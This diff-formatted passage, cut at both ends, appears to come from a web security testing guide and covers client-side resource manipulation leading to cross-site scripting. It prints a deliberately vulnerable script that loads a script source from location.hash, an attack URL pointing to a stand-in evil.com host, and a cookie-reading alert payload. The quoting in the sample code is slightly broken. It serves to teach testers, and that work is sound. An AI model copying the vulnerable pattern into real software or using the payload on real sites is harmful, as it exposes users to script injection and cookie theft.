@@ -1,0 +1,28 @@
+urces present
+in a web page. The impact may vary on the basis of the type of
+the element whose URL is controlled by the attacker, and it is
+usually adopted to conduct Cross-Site Scripting attacks.
+How to Test
+Such a vulnerability occurs when the application employs user
+controlled URLs for referencing external/internal resources. In
+these circumstances it is possible to interfere with the expected
+application’s behavior in the sense of making it load and render
+malicious objects.
+The following JavaScript code shows a possible vulnerable
+script in which the attacker is able to control the “location.hash”
+(source) which reaches the attribute “src” of a script element.
+This particular obviously leads XSS since an external JavaScript
+could be easily injected in the trusted web site.
+<script>
+var d=document.createElement("script’);
+if(location.hash.slice(1))
+d.src = location.hash.slice(1);
+document.body.appendChild(d);
+</script>
+Specifically the attacker could target the victim by asking her to
+visit the following URL:
+www.victim.com/#http:/evil.com/js.js
+Where js.js contains:
+alert(document.cookie)
+Controlling scripts’ sources is a basic example, since some other
+interesting and more s
